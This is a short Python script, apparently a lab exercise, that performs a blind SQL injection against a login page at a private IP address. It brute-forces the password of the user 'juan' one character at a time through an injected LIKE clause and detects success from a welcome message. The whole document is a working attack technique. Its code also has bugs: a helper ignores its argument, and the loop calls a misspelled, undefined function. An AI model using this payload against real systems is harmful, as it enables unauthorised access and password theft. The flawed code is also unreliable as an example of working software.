import requests 
import time
import json

def _longitud_str(mi_string):
	l=0
	for i in allcaracters:
		l = l + 1
	return l	

if __name__ == "__main__":

	contrasena=''
	passw1="') or user_password like '"  
	passw2="%' or ('a'='1"
	allcaracters='abcdefghijklmnopqrstuvwxyz0123456789'
	url = 'http://172.21.3.34/index.php?action=login'

	l=_longitud_str(allcaracters)

	while 1 == 1:
		for y in range(1,37):
			payload =  {'username': 'juan','password': passw1+contrasena+allcaracters[y-1:y]+passw2}
			r = requests.post(url, data=payload)
			if 'ienvenido' in r.text:
				print('Bienvenido')
				contrasena=contrasena+allcaracters[y-1:y]
				print('la contrasena es: '+contrasena+'...')
			else:
				pass
				#print('Favor de Autenticarse')
		if longitud_str(contrasena) == 2:
			break
